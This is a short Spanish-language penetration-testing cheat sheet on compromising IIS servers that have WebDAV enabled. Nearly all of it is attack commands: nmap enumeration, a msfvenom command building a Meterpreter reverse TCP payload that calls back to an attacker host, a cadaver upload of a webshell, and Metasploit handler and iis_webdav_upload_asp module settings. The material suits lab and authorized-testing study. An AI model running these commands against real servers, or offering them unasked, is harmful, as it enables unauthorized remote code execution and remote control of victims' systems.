Permite subir un payload ASP a servidores IIS con WebDAV habilitado.

• Requiere WebDAV activo  
• Permite subida de archivos  
• Puede llevar a RCE
## Enumeración WebDAV

Detecta si WebDAV está habilitado.

```
nmap -sV -p PORT --script=http-enum IP
```

## Generar Payload

Crea un archivo malicioso para subir al servidor.

```
msfvenom  -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f FORMATO > shell.FORMATO
```

## Subir Webshell

Permite subir archivos al servidor.

```
cadaver http://IP/RUTA_WEBDAV
```
	Dentro de cadaver:

```
put /usr/share/webshells/
```

## Handler (Listener)

Escucha la conexión entrante del payload.

```
use /exploit/multi/handler
```
	set PAYLOAD windows/meterpreter/reverse_tcp
	set LHOST IP
	set LPORT PORT

## IIS WebDAV Upload (Automático)

Explota automáticamente la subida del payload.

```
use exploit/windows/iis/iis_webdav_upload_asp
```
	set RHOSTS IP  
	set RPORT 80  
	set PATH /webdav/shell.asp  
	set PAYLOAD windows/meterpreter/reverse_tcp  
	set LHOST IP  
	set LPORT PORT
